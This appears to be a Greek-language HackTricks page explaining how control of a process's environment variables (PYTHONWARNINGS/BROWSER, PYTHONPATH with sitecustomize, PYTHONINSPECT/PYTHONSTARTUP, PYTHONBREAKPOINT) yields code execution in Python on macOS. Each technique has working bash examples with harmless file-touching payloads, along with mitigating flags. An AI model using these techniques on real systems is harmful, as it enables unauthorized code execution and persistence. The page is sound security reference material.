# Εγχυση σε εφαρμογές Python του macOS

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των μεταβλητών περιβάλλοντος `PYTHONWARNINGS` και `BROWSER`

Αν ένας attacker μπορεί να ελέγξει το περιβάλλον μιας διεργασίας Python, ο συνδυασμός των `PYTHONWARNINGS` και `BROWSER` μπορεί να προκαλέσει εκτέλεση εντολών όταν η Python εισάγει το module `antigravity` κατά την επεξεργασία μιας ειδικά διαμορφωμένης επιλογής προειδοποίησης. Η τεχνική βασίζεται στο ότι το `antigravity` ανοίγει ένα URL με το module `webbrowser` της Python, το οποίο λαμβάνει υπόψη τη μεταβλητή περιβάλλοντος `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Μέσω `PYTHONPATH` και `sitecustomize.py`

Κατά την κανονική εκκίνηση, το module `site` της Python προσθέτει paths ειδικά για το site και έπειτα επιχειρεί να κάνει import ένα module με όνομα `sitecustomize`. Τοποθετώντας έναν κατάλογο αναγνώσιμο από τον attacker πρώτο στο `PYTHONPATH`, ένας attacker που ελέγχει το περιβάλλον της διεργασίας μπορεί να κάνει την Python να κάνει import ένα payload πριν από το script-στόχο. Η σημαία `-S` απενεργοποιεί την αυτόματη αρχικοποίηση του `site`, ενώ η isolated mode (`-I`) αγνοεί το `PYTHONPATH` και συνεπάγεται τις `-s` και `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Για persistence μέσω ενός εγγράψιμου user site αντί για κληρονομημένο `PYTHONPATH`, δείτε τα [αρχεία εκκίνησης Python `.pth`, `.start` και `usercustomize`](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Μέσω των `PYTHONINSPECT` και `PYTHONSTARTUP` μετά από ένα script

Στο CPython 3.13+, ένα script που εκκινείται με `PYTHONINSPECT=1` εισέρχεται σε interactive session όταν ολοκληρωθεί. Αν η standard input είναι τερματικό και το PyREPL είναι διαθέσιμο, αυτή η session εκτελεί το αρχείο που ορίζεται από το `PYTHONSTARTUP` **μετά** το target script και πριν από το prompt. Έτσι, ένας attacker που ελέγχει και τις δύο inherited μεταβλητές και ένα αναγνώσιμο αρχείο εκκίνησης μπορεί να εκτελέσει κώδικα στη διεργασία-στόχο χωρίς να τροποποιήσει το script της. Πρόκειται για trigger μετά το script, όχι για κανονικό startup hook.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Η αλυσίδα δεν εκτελεί το αρχείο εκκίνησης σε παλαιότερες εκδόσεις CPython, όταν η τυπική είσοδος δεν είναι τερματικό ή όταν το `PYTHONBASICREPL` επιβάλλει το βασικό REPL. Τα `-E` και `-I` αγνοούν τις μεταβλητές `PYTHON*`. Ελέγξτε τον πραγματικό διερμηνευτή και το περιβάλλον του τερματικού πριν βασιστείτε σε αυτήν τη διαδρομή.<sup>[[3]](#references)[[5]](#references)</sup>

## Μέσω του `PYTHONBREAKPOINT`

Από την Python 3.7 (PEP 553), η ενσωματωμένη `breakpoint()` εισάγει και καλεί ό,τι δείχνει το `sys.breakpointhook`, και αυτός ο στόχος ορίζεται από τη μεταβλητή περιβάλλοντος **`PYTHONBREAKPOINT`** (`package.module.callable`). Τόσο η εισαγωγή της καθορισμένης ενότητας όσο και η κλήση της συνάρτησης εκτελούνται πριν εμφανιστεί κανονικά ο debugger. Έτσι, ένας επιτιθέμενος που ελέγχει το περιβάλλον μιας διεργασίας η οποία φτάνει σε μια `breakpoint()` (συνηθισμένο σε σενάρια συντήρησης/debug, και μερικές φορές παραμένει σε διαδρομές παραγωγής) αποκτά εκτέλεση κώδικα.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Σε αντίθεση με τα `PYTHONWARNINGS`/`PYTHONPATH`, αυτό απαιτεί ο στόχος να φτάσει πράγματι σε μια κλήση `breakpoint()`, αλλά λειτουργεί επίσης αποκλειστικά μέσω των **παρενεργειών κατά το import** του κατονομαζόμενου module (ορίστε οποιοδήποτε module μπορεί να γίνει import — για παράδειγμα, ένα που βρίσκεται πρώτο στο `PYTHONPATH` — και εκτελεί κώδικα στο ανώτερο επίπεδό του). Η ρύθμιση `PYTHONBREAKPOINT=0` απενεργοποιεί εντελώς το hook.



## References

- [1] [Hacking με Μεταβλητές Περιβάλλοντος - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ρύθμισης παραμέτρων ειδικό για το site](https://docs.python.org/3/library/site.html)
- [3] [Γραμμή εντολών και περιβάλλον Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Ενσωματωμένη breakpoint() και PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Αποστολή REPL του interpreter CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Εκτέλεση αρχείου εκκίνησης PyREPL του CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
